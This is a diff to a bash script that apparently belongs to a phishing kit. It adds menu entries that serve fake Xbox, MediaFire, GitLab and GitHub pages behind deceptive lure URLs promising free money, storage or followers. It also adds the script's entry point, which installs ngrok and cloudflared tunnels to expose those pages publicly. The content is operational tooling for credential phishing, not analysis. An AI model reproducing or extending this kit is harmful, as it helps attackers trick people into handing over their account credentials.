@@ -596,4 +596,36 @@ main_menu() {
 			tunnel_menu;;
 		29)
 			site_vk;;
+                30)
+			website="xbox"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		31)
+			website="mediafire"
+			mask='http://get-1TB-on-mediafire-free'
+			tunnel_menu;;
+		32)
+			website="gitlab"
+			mask='http://get-1k-followers-on-gitlab-free'
+			tunnel_menu;;
+		33)
+			website="github"
+			mask='http://get-1k-followers-on-github-free'
+			tunnel_menu;;
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
 	
+	esac
+}
+
+## Main
+kill_pid
+dependencies
+install_ngrok
+install_cloudflared
+main_menu
